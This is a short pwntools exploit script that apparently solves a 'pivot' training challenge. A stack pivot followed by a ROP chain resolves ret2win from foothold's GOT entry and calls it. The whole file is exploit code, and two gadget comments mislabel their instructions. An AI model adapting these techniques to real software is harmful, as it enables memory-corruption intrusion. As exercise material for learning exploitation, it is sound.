#!/usr/bin/env python3

from pwn import *

pwn = process("./pivot")
#gdb.attach(pwn, '''
#break main
#''')

#------------------- TOYS ------------------------#
junk = b'A' * 40

pop_rax = p64(0x0000000000400b00) # pop rax; ret;
xchg_rax_rsp = p64(0x0000000000400b02) # xchg rax, rsp; ret;
offset = p64(0x14e) # 0x00100abe ret2win - 0x00100970 foothold
foothold = p64(0x00400850)
foothold_got_plt = p64(0x00602048)
mov_rax = p64(0x0000000000400b05) # mov rax, qword ptr [rax]; ret;
pop_rbp = p64(0x0000000000400900) # add rax, rbp; ret;
add_rax_rbp = p64(0x0000000000400b09) # add eax, ebp; ret;
call_rax = p64(0x000000000040098e) # call rax; 
#------------------- TOYS ------------------------#

pwn.recvuntil(b'pivot: ')
pivot_addr = pwn.recvline().decode().replace("0x","")
pivot_addr = int(pivot_addr,16)
pivot_addr = p64(pivot_addr)


#-----SECOND ROP CHAIN-----#
pivot = foothold
pivot += pop_rax
pivot += foothold_got_plt # now holds the real address of the function
pivot += mov_rax # move the value held there into rax, address of function
pivot += pop_rbp 
pivot += offset # offset now in rbp
pivot += add_rax_rbp # rax now holds ret2win address
pivot += call_rax
#--------------------------#

#-----FIRST ROP CHAIN-----#
buf = junk
buf += pop_rax
buf += pivot_addr
buf += xchg_rax_rsp
#------------------------_#

pwn.sendline(pivot)
pwn.sendline(buf)
pwn.interactive()
